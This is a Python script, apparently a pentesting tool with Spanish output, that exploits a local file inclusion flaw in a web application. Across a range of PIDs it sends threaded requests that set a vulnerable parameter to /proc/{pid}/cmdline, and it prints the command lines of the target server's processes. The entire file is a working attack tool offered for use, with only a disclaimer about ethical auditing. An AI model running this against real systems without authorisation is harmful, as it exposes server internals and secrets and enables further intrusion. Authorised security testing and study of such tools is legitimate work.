# Copyright (C) 2025 / S1131
# This program is free software under the GNU GPLv3 license.
# DISCLAIMER:
# This script is provided for educational and ethical auditing purposes.
# The author is NOT LIABLE for any damage, data loss, or
# legal action resulting from the misuse of this tool.
# Use at your own risk and responsibility.


import requests
import argparse
import os
import signal
from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor, as_completed


def signal_handler(sig, frame):
    print("\r[!] Deteniendo instantáneamente...             ")
    os._exit(0)

signal.signal(signal.SIGINT, signal_handler)

def get_process_cmdline(pid, url, param, method, timeout):
    try:
        
        path = f'/proc/{pid}/cmdline'
        
        if method.upper() == "GET":
            response = requests.get(url, params={param: path}, timeout=timeout)
        else:
            response = requests.post(url, data={param: path}, timeout=timeout)
            
        if response.status_code == 200 and "Bienvenido" not in response.text:
            content = response.text.replace('\x00', ' ').strip()
            if content: return pid, content
        
    except:
        pass
    return None

def main():
    
    parser = argparse.ArgumentParser(description="LFI Process Enumerator - Core Edition")
    parser.add_argument("-u", "--url", required=True, help="URL objetivo")
    parser.add_argument("-p", "--param", required=True, help="Parámetro vulnerable al LFI")
    parser.add_argument("-m", "--method", default="GET", choices=["GET", "POST"], help="Método HTTP (GET/POST)")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Número de hilos")
    parser.add_argument("-r", "--range", type=int, default=1000, help="Rango máximo de PIDs a escanear")
    parser.add_argument("--timeout", type=float, default=0.5, help="Timeout por petición")

    args = parser.parse_args()

    total_process = []

    print(f"[*] Iniciando enumeracion ...\n")
    print(f"[*] Para detener el proceso presione Ctrl + C \n")
    print(f"[*] Objetivo: {args.url}")
    print(f"[*] Método: {args.method} | Parámetro: {args.param}")
    print(f"[*] Hilos: {args.threads} | Rango: 1-{args.range}\n")

    executor = ThreadPoolExecutor(max_workers=args.threads)
    
    try:
        futures = [executor.submit(get_process_cmdline, pid, args.url, args.param, args.method, args.timeout) 
                   for pid in range(1, args.range + 1)]
        
        with tqdm(total=len(futures), desc="Fuzzing PIDs", unit="pid", leave=False) as pbar:
            for future in as_completed(futures):
                result = future.result()
                if result:
                    pid, command = result
                    pbar.write(f"[+] PID {pid}: {command}")
                    total_process.append(result)
                pbar.update(1)

        print(f"\n[*] Se encontraron: {len(total_process)} procesos!")
        
    except Exception as e:
        print(f"\n[!] Error inesperado: {e}")
    finally:
        executor.shutdown(wait=False)

if __name__ == "__main__":
    main()
